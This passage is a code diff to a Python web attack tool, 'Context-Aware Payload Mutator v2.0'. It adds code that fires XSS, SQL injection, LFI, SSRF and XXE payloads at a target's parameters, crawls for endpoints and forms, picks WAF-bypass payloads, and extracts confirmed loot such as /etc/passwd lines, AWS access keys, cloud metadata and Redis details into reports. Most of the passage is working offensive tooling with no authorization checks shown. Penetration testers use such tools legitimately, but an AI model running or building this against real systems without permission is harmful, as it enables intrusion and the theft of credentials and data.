+            (r"ami-id|instance-id|local-ipv4", "CONFIRMED: AWS EC2 metadata exposed"),
+            (r"AccessKeyId|SecretAccessKey", "CONFIRMED: AWS IAM credentials in response"),
+            (r"computeMetadata|gce-metadata", "CONFIRMED: GCP metadata exposed"),
+            (r"redis_version|connected_clients", "CONFIRMED: Redis info via SSRF"),
+        ],
+        "XXE": [
+            (r"root:.*:0:0:", "CONFIRMED: /etc/passwd via XXE"),
+            (r"127\.0\.0\.1\s+localhost", "CONFIRMED: /etc/hosts via XXE"),
+        ],
+        "XSS": [
+            (r"alert\(document\.domain\)|alert\(1\)", "REFLECTED: XSS payload in response — verify in browser"),
+            (r"onerror=alert|onload=alert|onfocus=alert", "REFLECTED: Event handler present in response"),
+            (r"<script>.*?alert", "REFLECTED: Script tag with alert in response"),
+        ],
+    }
+
+    EXTRACT_PATTERNS = {
+        "LFI": [
+            r"([a-zA-Z0-9_-]+:[x*!\$][:\d]+:[:\d]+:[^:\n]*:[^:\n]*:[^\n]+)",
+            r"(root:[^:\n]+:[^:\n]+:[^:\n]+:[^:\n]+:[^:\n]+:[^\n]+)",
+            r"(SSH_\w+=\S+|PATH=[^\n]+|HOME=[^\n]+|USER=[^\n]+|SHELL=[^\n]+)",
+            r"(\d+\.\d+\.\d+\.\d+\s+\S+)",
+            r"(\$[a-z0-9]+\$[^\s:]+)",
+        ],
+        "SQLi": [
+            r"((?:MySQL|ORA|MSSQL|PostgreSQL|SQLite).*?(?:error|Error|ERROR)[^\n<]+)",
+            r"(SQLSTATE\[[^\]]+\][^\n<]+)",
+            r"(TABLE_NAME[^\n<]{10,80})",
+            r"([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})",
+        ],
+        "SSRF": [
+            r"(ami-id[^\n<]+)",
+            r"(instance-id[^\n<]+)",
+            r"(local-ipv4[^\n<]+)",
+            r"(AccessKeyId[^\n<]+)",
+            r"(SecretAccessKey[^\n<]+)",
+            r"(redis_version[^\n<]+)",
+            r"(connected_clients[^\n<]+)",
+        ],
+        "XXE": [
+            r"([a-zA-Z0-9_-]+:[x*!\$][:\d]+:[:\d]+:[^:\n]*:[^:\n]*:[^\n]+)",
+            r"(\d+\.\d+\.\d+\.\d+\s+\S+)",
+        ],
+    }
+
+    def __init__(self, session, timeout=15, delay=0.5):
+        self.session = session
+        self.timeout = timeout
+        self.delay = delay
+
+    def fire(self, url: str, param: str, method: str, payload: Payload) -> FireResult:
+        start = time.time()
+        try:
+            full_url, response = self._send(url, param, payload.raw, method)
+        except Exception as e:
+            return FireResult(url, param, method, payload, 0, 0,
+                              False, f"Request failed: {e}", "", "", url)
+
+        elapsed = time.time() - start
+        time.sleep(self.delay)
+
+        confirmed, evidence, extracted = self._analyze(response.text, payload, elapsed)
+        snippet = self._get_snippet(response.text, payload.raw)
+
+        return FireResult(
+            endpoint=url, parameter=param, method=method, payload=payload,
+            status_code=response.status_code, response_time=elapsed,
+            confirmed=confirmed, evidence=evidence, extracted_data=extracted,
+            response_snippet=snippet, full_url=full_url
+        )
+
+    def _send(self, url: str, param: str, value: str, method: str):
+        if method.upper() == "POST":
+            r = self.session.post(url, data={param: value},
+                                  timeout=self.timeout, verify=False)
+            return url, r
+        parsed = urllib.parse.urlparse(url)
+        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+        qs[param] = [value]
+        new_qs = urllib.parse.urlencode(qs, doseq=True)
+        full_url = parsed._replace(query=new_qs).geturl()
+        r = self.session.get(full_url, timeout=self.timeout,
+                             verify=False, allow_redirects=True)
+        return full_url, r
+
+    def _analyze(self, body: str, payload: Payload, elapsed: float):
+        vuln_type = payload.vuln_type or "XSS"
+
+        # Time-based SQLi
+        if "SLEEP" in payload.raw or "WAITFOR" in payload.raw:
+            if elapsed >= 4.5:
+                return (True,
+                        f"CONFIRMED: Time-based SQLi — delayed {elapsed:.1f}s (expected ~5s)",
+                        "")
+
+        patterns = self.SUCCESS_PATTERNS.get(vuln_type, [])
+        for pattern, message in patterns:
+            match = re.search(pattern, body, re.IGNORECASE | re.DOTALL)
+            if match:
+                extracted = self._extract_data(body, vuln_type)
+                return True, message, extracted
+
+        return False, "", ""
+
+    def _extract_data(self, body: str, vuln_type: str) -> str:
+        patterns = self.EXTRACT_PATTERNS.get(vuln_type, [])
+        lines = []
+        for pattern in patterns:
+            matches = re.findall(pattern, body, re.IGNORECASE)
+            for m in matches[:5]:
+                line = (m.strip() if isinstance(m, str)
+                        else " ".join(m).strip())
+                if line and line not in lines:
+                    lines.append(line)
+        return "\n".join(lines[:20])
+
+    def _get_snippet(self, body: str, payload_raw: str) -> str:
+        idx = body.find(payload_raw[:20])
+        if idx == -1:
+            idx = body.find(html.escape(payload_raw[:20]))
+        if idx == -1:
+            return ""
+        start = max(0, idx - 80)
+        end = min(len(body), idx + 220)
+        snippet = re.sub(r'\s+', ' ', body[start:end].strip())
+        return snippet[:300]
+
+
+# ──────────────────────────────────────────────
+#  Master Scanner
 # ──────────────────────────────────────────────
 
 class PayloadMutator:
-    def __init__(self, proxy: Optional[str] = None, delay: float = 0.5,
-                 timeout: int = 10, headers: Optional[dict] = None):
+    def __init__(self, proxy=None, delay=0.5, timeout=15,
+                 headers=None, vuln_filter=None):
         self.proxy = {"http": proxy, "https": proxy} if proxy else None
         self.delay = delay
         self.timeout = timeout
+        self.vuln_filter = [v.upper() for v in vuln_filter] if vuln_filter else None
+
         self.session = requests.Session()
         self.session.headers.update({
-            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "User-Agent": ("Mozilla/5.0 (X11; Linux x86_64; rv:109.0) "
+                           "Gecko/20100101 Firefox/115.0"),
             **(headers or {})
         })
-        self.detector = ContextDetector()
-        self.waf_detector = WAFDetector()
-        self.library = PayloadLibrary()
+        if self.proxy:
+            self.session.proxies = self.proxy
 
-    def probe(self, url: str, param: str, method: str = "GET") -> ScanResult:
-        result = ScanResult(url=url, parameter=param)
-        probe_value = ContextDetector.PROBE
+        self.detector = ContextDetector()
+        self.waf_det  = WAFDetector()
+        self.library  = PayloadLibrary()
+        self.firer    = PayloadFirer(self.session, timeout=timeout, delay=delay)
+        self.crawler  = EndpointCrawler(self.session, timeout=timeout, delay=delay)
+
+    def run(self, url: str, param=None, method="GET",
+            crawl=False, fire=True, forms=False) -> list:
+        targets = self.crawler.discover(url, param, crawl=crawl)
+
+        if forms:
+            print(f"{Fore.CYAN}[*] Extracting forms and links...")
+            extra = self.crawler.extract_links_and_forms(url)
+            targets += extra
+            print(f"{Fore.CYAN}[*] {len(extra)} additional form/link targets found")
+
+        print(f"\n{Fore.CYAN}[*] Testing {len(targets)} endpoint/parameter combination(s)\n")
+        results = []
+        for ep_url, ep_param, ep_method in targets:
+            result = self._scan_endpoint(ep_url, ep_param, ep_method, fire)
+            results.append(result)
+        return results
+
+    def _scan_endpoint(self, url: str, param: str, method: str, fire: bool):
+        result = EndpointResult(url=url, parameter=param, method=method)
+        print(f"{Fore.WHITE}[PROBE] {method} {url} → param={param}")
 
         try:
-            response, elapsed = self._send(url, param, probe_value, method)
+            _, probe_resp = self.firer._send(url, param, ContextDetector.PROBE, method)
         except Exception as e:
-            print(f"{Fore.RED}[ERROR] Request failed: {e}")
+            print(f"  {Fore.RED}[!] Probe failed: {e}")
             return result
 
-        result.response_time = elapsed
-
-        # WAF detection
-        waf_found, waf_vendor = self.waf_detector.detect(response)
+        waf_found, waf_vendor = self.waf_det.detect(probe_resp)
         result.waf_detected = waf_found
         result.waf_vendor = waf_vendor
+        if waf_found:
+            print(f"  {Fore.RED}[WAF] {waf_vendor} — adding bypass payloads")
 
-        if probe_value not in response.text:
-            print(f"{Fore.YELLOW}[!] Probe not reflected in response — may be filtered or not injectable")
+        probe_reflected = ContextDetector.PROBE in probe_resp.text
+        if probe_reflected:
+            result.contexts = self.detector.detect(probe_resp.text)
+            for ctx in result.contexts[:3]:
+                print(f"  {Fore.GREEN}[CTX] {ctx.name} ({ctx.confidence*100:.0f}%)")
+        else:
+            print(f"  {Fore.YELLOW}[!] Probe not reflected — firing blind payloads anyway")
+
+        if not fire:
             return result
 
-        # Context detection
-        result.contexts = self.detector.detect(response.text)
+        # Build payload list
+        all_payloads = []
+        seen_raws = set()
+        contexts_to_use = result.contexts if result.contexts else [
+            Context("url_parameter", "", 0.5)
+        ]
 
-        # Generate payloads for each detected context
-        seen = set()
-        for ctx in result.contexts:
+        for ctx in contexts_to_use:
+            if ctx.name == "unknown":
+                ctx.name = "url_parameter"
             for p in self.library.get_payloads(ctx.name, waf_found):
-                if p.raw not in seen:
-                    seen.add(p.raw)
-                    result.payloads.append(p)
+                if p.raw not in seen_raws:
+                    if self.vuln_filter and p.vuln_type.upper() not in self.vuln_filter:
+                        continue
+                    seen_raws.add(p.raw)
+                    all_payloads.append(p)
 
+        print(f"  {Fore.CYAN}[FIRE] Sending {len(all_payloads)} payloads...")
+
+        for payload in all_payloads:
+            fr = self.firer.fire(url, param, method, payload)
+            result.fire_results.append(fr)
+            if fr.confirmed:
+                print(f"  {Fore.RED}{Style.BRIGHT}[HIT] {payload.vuln_type} "
+                      f"— {fr.evidence[:70]}")
+
+        confirmed = sum(1 for fr in result.fire_results if fr.confirmed)
+        print(f"  {Fore.WHITE}[DONE] {confirmed}/{len(all_payloads)} confirmed\n")
         return result
 
-    def _send(self, url: str, param: str, value: str,
-              method: str) -> tuple[requests.Response, float]:
-        start = time.time()
-        if method.upper() == "GET":
-            parsed = urllib.parse.urlparse(url)
-            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
-            qs[param] = [value]
-            new_qs = urllib.parse.urlencode(qs, doseq=True)
-            new_url = parsed._replace(query=new_qs).geturl()
-            resp = self.session.get(new_url, timeout=self.timeout, proxies=self.proxy, verify=False)
-        else:
-            resp = self.session.post(url, data={param: value},
-                                     timeout=self.timeout, proxies=self.proxy, verify=False)
-        elapsed = time.time() - start
-        time.sleep(self.delay)
-        return resp, elapsed
-
 
 # ──────────────────────────────────────────────
-#  Output / Display
+#  Output / Reporting
 # ──────────────────────────────────────────────
 
-RISK_COLOR = {
-    "high":   Fore.RED,
-    "medium": Fore.YELLOW,
-    "low":    Fore.GREEN,
-}
+RISK_COLOR = {"high": Fore.RED, "medium": Fore.YELLOW, "low": Fore.GREEN}
 
 def banner():
     print(f"""{Fore.CYAN}{Style.BRIGHT}
@@ -406,100 +674,180 @@ def banner():
  ██║     ██╔══██║██╔═══╝ ██║╚██╔╝██║
  ╚██████╗██║  ██║██║     ██║ ╚═╝ ██║
   ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚═╝
-{Style.RESET_ALL}{Fore.WHITE}  Context-Aware Payload Mutator  {Fore.CYAN}v1.0
-  {Fore.WHITE}Web App Red Team Tool
+{Style.RESET_ALL}{Fore.WHITE}  Context-Aware Payload Mutator  {Fore.CYAN}v2.0
+  {Fore.WHITE}Active Firing + Data Extraction Edition
 {Style.RESET_ALL}""")
 
-def print_result(result: ScanResult, output_format: str = "terminal"):
+
+def print_results(all_results: list, output_format: str = "terminal"):
     if output_format == "json":
-        data = {
-            "url": result.url,
-            "parameter": result.parameter,
-            "waf_detected": result.waf_detected,
-            "waf_vendor": result.waf_vendor,
-            "response_time_ms": round(result.response_time * 1000, 2),
-            "contexts": [
-                {"name": c.name, "description": c.description, "confidence": c.confidence}
-                for c in result.contexts
-            ],
-            "payloads": [
-                {"payload": p.raw, "context": p.context, "encoding": p.encoding,
-                 "bypass_type": p.bypass_type, "risk": p.risk, "notes": p.notes}
-                for p in result.payloads
-            ]
-        }
-        print(json.dumps(data, indent=2))
+        out = []
+        for r in all_results:
+            out.append({
+                "url": r.url, "parameter": r.parameter, "method": r.method,
+                "waf": r.waf_vendor if r.waf_detected else None,
+                "contexts": [{"name": c.name, "confidence": c.confidence}
+                             for c in r.contexts],
+                "payloads_fired": len(r.fire_results),
+                "confirmed_hits": [
+                    {
+                        "full_url": fr.full_url,
+                        "parameter": fr.parameter,
+                        "method": fr.method,
+                        "payload": fr.payload.raw,
+                        "vuln_type": fr.payload.vuln_type,
+                        "risk": fr.payload.risk,
+                        "status_code": fr.status_code,
+                        "response_time_ms": round(fr.response_time * 1000, 1),
+                        "evidence": fr.evidence,
+                        "extracted_data": fr.extracted_data,
+                        "response_snippet": fr.response_snippet,
+                    }
+                    for fr in r.fire_results if fr.confirmed
+                ],
+            })
+        print(json.dumps(out, indent=2))
         return
 
-    print(f"\n{Fore.CYAN}{'═'*60}")
-    print(f"{Fore.WHITE}{Style.BRIGHT}  SCAN RESULTS")
-    print(f"{Fore.CYAN}{'═'*60}{Style.RESET_ALL}")
-    print(f"  {Fore.WHITE}Target   : {Fore.YELLOW}{result.url}")
-    print(f"  {Fore.WHITE}Parameter: {Fore.YELLOW}{result.parameter}")
-    print(f"  {Fore.WHITE}Resp Time: {Fore.YELLOW}{result.response_time*1000:.0f}ms")
+    total_confirmed = sum(
+        sum(1 for fr in r.fire_results if fr.confirmed)
+        for r in all_results
+    )
 
-    if result.waf_detected:
-        print(f"  {Fore.WHITE}WAF      : {Fore.RED}⚠  DETECTED — {result.waf_vendor}")
-        print(f"             {Fore.YELLOW}→ Bypass payloads included automatically")
-    else:
-        print(f"  {Fore.WHITE}WAF      : {Fore.GREEN}✓  Not detected")
+    print(f"\n{Fore.CYAN}{'═'*65}")
+    print(f"{Fore.WHITE}{Style.BRIGHT}  SCAN REPORT  —  {total_confirmed} CONFIRMED HIT(S)")
+    print(f"{Fore.CYAN}{'═'*65}{Style.RESET_ALL}")
 
-    if not result.contexts:
-        print(f"\n{Fore.RED}  [!] No reflection contexts detected.")
-        return
+    for ep in all_results:
+        confirmed_hits = [fr for fr in ep.fire_results if fr.confirmed]
+        all_tried = ep.fire_results
+        if not all_tried:
+            continue
 
-    print(f"\n{Fore.CYAN}  {'─'*56}")
-    print(f"{Fore.WHITE}{Style.BRIGHT}  DETECTED CONTEXTS ({len(result.contexts)}){Style.RESET_ALL}")
-    print(f"{Fore.CYAN}  {'─'*56}")
-    for i, ctx in enumerate(result.contexts, 1):
-        bar = int(ctx.confidence * 10)
-        bar_str = "█" * bar + "░" * (10 - bar)
-        color = Fore.GREEN if ctx.confidence > 0.8 else Fore.YELLOW
-        print(f"  {i}. {color}{ctx.name}")
-        print(f"     {Fore.WHITE}{ctx.description}")
-        print(f"     Confidence: {color}[{bar_str}] {ctx.confidence*100:.0f}%{Style.RESET_ALL}")
+        print(f"\n{Fore.WHITE}{Style.BRIGHT}  ┌─ ENDPOINT: {Fore.YELLOW}{ep.url}")
+        print(f"  {Fore.WHITE}│  Parameter : {Fore.YELLOW}{ep.parameter}   "
+              f"Method: {ep.method}")
+        if ep.waf_detected:
+            print(f"  {Fore.WHITE}│  WAF       : {Fore.RED}⚠  {ep.waf_vendor}")
+        if ep.contexts:
+            ctx_str = ", ".join(c.name for c in ep.contexts[:4])
+            print(f"  {Fore.WHITE}│  Contexts  : {Fore.CYAN}{ctx_str}")
+        print(f"  {Fore.WHITE}│  Payloads  : {len(all_tried)} fired — "
+              f"{Fore.RED if confirmed_hits else Fore.WHITE}"
+              f"{len(confirmed_hits)} confirmed{Style.RESET_ALL}")
 
-    print(f"\n{Fore.CYAN}  {'─'*56}")
-    print(f"{Fore.WHITE}{Style.BRIGHT}  GENERATED PAYLOADS ({len(result.payloads)}){Style.RESET_ALL}")
-    print(f"{Fore.CYAN}  {'─'*56}")
+        if not confirmed_hits:
+            print(f"  {Fore.WHITE}│")
+            print(f"  {Fore.YELLOW}│  No confirmed hits. Payloads tried:")
+            for fr in all_tried[:6]:
+                rc = RISK_COLOR.get(fr.payload.risk, Fore.WHITE)
+                print(f"  {Fore.WHITE}│    {rc}[{fr.payload.risk.upper():6s}] "
+                      f"{fr.payload.vuln_type:12s} "
+                      f"[HTTP {fr.status_code}]  "
+                      f"{Fore.WHITE}{fr.payload.raw[:55]}")
+            if len(all_tried) > 6:
+                print(f"  {Fore.WHITE}│    ... and {len(all_tried)-6} more")
+            print(f"  {Fore.WHITE}└{'─'*61}{Style.RESET_ALL}")
+            continue
 
-    for i, p in enumerate(result.payloads, 1):
-        risk_col = RISK_COLOR.get(p.risk, Fore.WHITE)
-        waf_tag = f" {Fore.MAGENTA}[WAF-BYPASS]" if "WAF-Bypass" in p.bypass_type else ""
-        print(f"\n  {Fore.WHITE}[{i:02d}]{waf_tag} {risk_col}[{p.risk.upper()}]"
-              f" {Fore.CYAN}{p.bypass_type}{Style.RESET_ALL}")
-        print(f"  {Fore.WHITE}Context : {Fore.YELLOW}{p.context}")
-        print(f"  {Fore.WHITE}Encoding: {Fore.YELLOW}{p.encoding}")
-        if p.notes:
-            print(f"  {Fore.WHITE}Notes   : {Fore.WHITE}{p.notes}")
-        print(f"  {Fore.GREEN}Payload : {Style.BRIGHT}{p.raw}{Style.RESET_ALL}")
+        print(f"  {Fore.WHITE}│")
+        print(f"  {Fore.RED}{Style.BRIGHT}│  ▶ CONFIRMED VULNERABILITIES{Style.RESET_ALL}")
 
-    print(f"\n{Fore.CYAN}{'═'*60}{Style.RESET_ALL}\n")
+        for i, fr in enumerate(confirmed_hits, 1):
+            rc = RISK_COLOR.get(fr.payload.risk, Fore.WHITE)
+            waf_tag = (f" {Fore.MAGENTA}[WAF-BYPASS]"
+                       if "WAF-Bypass" in fr.payload.bypass_type else "")
+
+            print(f"\n  {Fore.WHITE}│  {Style.BRIGHT}[HIT {i:02d}]{waf_tag} "
+                  f"{rc}{fr.payload.risk.upper()} — "
+                  f"{Fore.CYAN}{fr.payload.vuln_type}{Style.RESET_ALL}")
+
+            print(f"  {Fore.WHITE}│    ▸ Endpoint    : {Fore.GREEN}{fr.full_url}")
+            print(f"  {Fore.WHITE}│    ▸ Parameter   : {Fore.YELLOW}{fr.parameter}  "
+                  f"({fr.method})")
+            print(f"  {Fore.WHITE}│    ▸ HTTP Status : {Fore.YELLOW}{fr.status_code}  "
+                  f"Response: {fr.response_time*1000:.0f}ms")
+            print(f"  {Fore.WHITE}│    ▸ Evidence    : {Fore.RED}{fr.evidence}")
+            print(f"  {Fore.WHITE}│    ▸ Payload     : "
+                  f"{Fore.GREEN}{Style.BRIGHT}{fr.payload.raw}{Style.RESET_ALL}")
+            print(f"  {Fore.WHITE}│    ▸ Notes       : {fr.payload.notes}")
+
+            if fr.extracted_data:
+                print(f"\n  {Fore.RED}│    ╔══ EXTRACTED DATA "
+                      f"{'═'*40}")
+                for line in fr.extracted_data.splitlines():
+                    print(f"  {Fore.RED}│    ║  {line}")
+                print(f"  {Fore.RED}│    ╚{'═'*57}{Style.RESET_ALL}")
+
+            if fr.response_snippet:
+                print(f"\n  {Fore.WHITE}│    ╔══ RESPONSE SNIPPET "
+                      f"{'─'*38}")
+                print(f"  {Fore.WHITE}│    ║  "
+                      f"{Style.DIM}{fr.response_snippet[:260]}{Style.RESET_ALL}")
+                print(f"  {Fore.WHITE}│    ╚{'─'*57}{Style.RESET_ALL}")
+
+        print(f"\n  {Fore.WHITE}└{'─'*61}{Style.RESET_ALL}")
+
+    # Summary table
+    print(f"\n{Fore.CYAN}{'═'*65}")
+    print(f"{Fore.WHITE}{Style.BRIGHT}  SUMMARY")
+    print(f"{Fore.CYAN}{'═'*65}{Style.RESET_ALL}")
+    print(f"  {'ENDPOINT':<30} {'PARAM':<12} {'FIRED':<7} "
+          f"{'HITS':<6} {'VULN TYPES'}")
+    print(f"  {'─'*30} {'─'*12} {'─'*7} {'─'*6} {'─'*20}")
+    for r in all_results:
+        confirmed = [fr for fr in r.fire_results if fr.confirmed]
+        vtypes = list({fr.payload.vuln_type for fr in confirmed})
+        color = Fore.RED if confirmed else Fore.WHITE
+        short_url = (r.url[:28] + "..") if len(r.url) > 30 else r.url
+        print(f"  {color}{short_url:<30} {r.parameter:<12} "
+              f"{len(r.fire_results):<7} {len(confirmed):<6} "
+              f"{', '.join(vtypes) or '—'}{Style.RESET_ALL}")
+    print(f"\n{Fore.CYAN}{'═'*65}{Style.RESET_ALL}\n")
 
 
-def save_payloads(result: ScanResult, filepath: str):
+def export_report(all_results: list, filepath: str):
     with open(filepath, "w") as f:
-        for p in result.payloads:
-            f.write(p.raw + "\n")
-    print(f"{Fore.GREEN}[✓] Payloads saved to: {filepath}")
+        f.write("# CAPM v2.0 — Penetration Test Report\n\n")
+        total = sum(sum(1 for fr in r.fire_results if fr.confirmed)
+                    for r in all_results)
+        f.write(f"**Total Confirmed Vulnerabilities: {total}**\n\n---\n\n")
+        for r in all_results:
+            confirmed = [fr for fr in r.fire_results if fr.confirmed]
+            f.write(f"## `{r.url}` — param: `{r.parameter}`\n\n")
+            f.write(f"- WAF: {r.waf_vendor if r.waf_detected else 'None detected'}\n")
+            f.write(f"- Payloads fired: {len(r.fire_results)}\n")
+            f.write(f"- Confirmed: {len(confirmed)}\n\n")
+            if confirmed:
+                f.write("### Confirmed Vulnerabilities\n\n")
+                for i, fr in enumerate(confirmed, 1):
+                    f.write(f"#### {i}. {fr.payload.vuln_type} "
+                            f"[{fr.payload.risk.upper()}]\n\n")
+                    f.write(f"| Field | Value |\n|-------|-------|\n")
+                    f.write(f"| Full URL | `{fr.full_url}` |\n")
+                    f.write(f"| Parameter | `{fr.parameter}` ({fr.method}) |\n")
+                    f.write(f"| HTTP Status | {fr.status_code} |\n")
+                    f.write(f"| Response Time | {fr.response_time*1000:.0f}ms |\n")
+                    f.write(f"| Evidence | {fr.evidence} |\n")
+                    f.write(f"| Notes | {fr.payload.notes} |\n\n")
+                    f.write(f"**Payload:**\n```\n{fr.payload.raw}\n```\n\n")
+                    if fr.extracted_data:
+                        f.write(f"**Extracted Data:**\n```\n{fr.extracted_data}\n```\n\n")
+                    if fr.response_snippet:
+                        f.write(f"**Response Snippet:**\n```\n{fr.response_snippet}\n```\n\n")
+                    f.write("---\n\n")
+    print(f"{Fore.GREEN}[✓] Report saved to: {filepath}")
 
 
-def export_report(result: ScanResult, filepath: str):
+def save_confirmed_payloads(all_results: list, filepath: str):
     with open(filepath, "w") as f:
-        f.write("# Context-Aware Payload Mutator Report\n\n")
-        f.write(f"**URL:** `{result.url}`\n")
-        f.write(f"**Parameter:** `{result.parameter}`\n")
-        f.write(f"**WAF Detected:** {'Yes — ' + result.waf_vendor if result.waf_detected else 'No'}\n\n")
-        f.write("## Detected Contexts\n\n")
-        for c in result.contexts:
-            f.write(f"- **{c.name}** ({c.confidence*100:.0f}% confidence): {c.description}\n")
-        f.write("\n## Payloads\n\n")
-        f.write("| # | Risk | Type | Context | Encoding | Payload | Notes |\n")
-        f.write("|---|------|------|---------|----------|---------|-------|\n")
-        for i, p in enumerate(result.payloads, 1):
-            raw = p.raw.replace("|", "\\|")
-            f.write(f"| {i} | {p.risk} | {p.bypass_type} | {p.context} | {p.encoding} | `{raw}` | {p.notes} |\n")
-    print(f"{Fore.GREEN}[✓] Markdown report saved to: {filepath}")
+        for r in all_results:
+            for fr in r.fire_results:
+                if fr.confirmed:
+                    f.write(f"# [{fr.payload.vuln_type}] {r.url} "
+                            f"param={r.parameter}\n")
+                    f.write(fr.payload.raw + "\n\n")
+    print(f"{Fore.GREEN}[✓] Confirmed payloads saved to: {filepath}")
 
 
 # ──────────────────────────────────────────────
@@ -508,19 +856,35 @@ def export_report(result: ScanResult, filepath: str):
 
 def main():
     parser = argparse.ArgumentParser(
-        description="Context-Aware Payload Mutator — Red Team Web App Tool",
+        description="Context-Aware Payload Mutator v2.0",
         formatter_class=argparse.RawTextHelpFormatter
     )
-    parser.add_argument("-u", "--url",       required=True, help="Target URL")
-    parser.add_argument("-p", "--param",     required=True, help="Parameter to test")
-    parser.add_argument("-m", "--method",    default="GET", choices=["GET", "POST"], help="HTTP method")
-    parser.add_argument("--proxy",           help="Proxy URL (e.g. http://127.0.0.1:8080)")
-    parser.add_argument("--delay",           type=float, default=0.5, help="Delay between requests (seconds)")
-    parser.add_argument("--timeout",         type=int, default=10, help="Request timeout (seconds)")
-    parser.add_argument("--header",          action="append", metavar="K:V", help="Custom headers (repeatable)")
-    parser.add_argument("--output",          choices=["terminal", "json"], default="terminal")
-    parser.add_argument("--save-payloads",   metavar="FILE", help="Save payload list to a file")
-    parser.add_argument("--export-report",   metavar="FILE", help="Export markdown report to a file")
+    parser.add_argument("-u", "--url",        required=True,
+                        help="Target URL")
+    parser.add_argument("-p", "--param",
+                        help="Parameter to test (auto-detects if omitted)")
+    parser.add_argument("-m", "--method",     default="GET",
+                        choices=["GET", "POST"])
+    parser.add_argument("--crawl",            action="store_true",
+                        help="Crawl common paths for additional endpoints")
+    parser.add_argument("--forms",            action="store_true",
+                        help="Extract and test forms/links from page")
+    parser.add_argument("--no-fire",          action="store_true",
+                        help="Context detection only — do not fire payloads")
+    parser.add_argument("--only",
+                        help="Limit to vuln type(s): xss,sqli,lfi,ssrf,xxe")
+    parser.add_argument("--proxy",
+                        help="Proxy URL e.g. http://127.0.0.1:8080")
+    parser.add_argument("--delay",            type=float, default=0.5)
+    parser.add_argument("--timeout",          type=int,   default=15)
+    parser.add_argument("--header",           action="append", metavar="K:V",
+                        help="Custom header (repeatable)")
+    parser.add_argument("--output",           choices=["terminal", "json"],
+                        default="terminal")
+    parser.add_argument("--export-report",    metavar="FILE",
+                        help="Save markdown report")
+    parser.add_argument("--save-payloads",    metavar="FILE",
+                        help="Save confirmed payloads only")
     args = parser.parse_args()
 
     banner()
@@ -532,25 +896,34 @@ def main():
                 k, v = h.split(":", 1)
                 headers[k.strip()] = v.strip()
 
+    vuln_filter = None
+    if args.only:
+        vuln_filter = [v.strip().upper() for v in args.only.split(",")]
+        print(f"{Fore.CYAN}[*] Filtering to: {', '.join(vuln_filter)}\n")
+
     mutator = PayloadMutator(
         proxy=args.proxy,
         delay=args.delay,
         timeout=args.timeout,
-        headers=headers
+        headers=headers,
+        vuln_filter=vuln_filter,
     )
 
-    print(f"{Fore.CYAN}[*] Probing: {Fore.WHITE}{args.url}")
-    print(f"{Fore.CYAN}[*] Parameter: {Fore.WHITE}{args.param}")
-    print(f"{Fore.CYAN}[*] Method: {Fore.WHITE}{args.method}\n")
+    results = mutator.run(
+        url=args.url,
+        param=args.param,
+        method=args.method,
+        crawl=args.crawl,
+        fire=not args.no_fire,
+        forms=args.forms,
+    )
 
-    result = mutator.probe(args.url, args.param, args.method)
-    print_result(result, args.output)
-
-    if args.save_payloads:
-        save_payloads(result, args.save_payloads)
+    print_results(results, args.output)
 
     if args.export_report:
-        export_report(result, args.export_report)
+        export_report(results, args.export_report)
+    if args.save_payloads:
+        save_confirmed_payloads(results, args.save_payloads)
 
 
 if __name__ == "__main__":
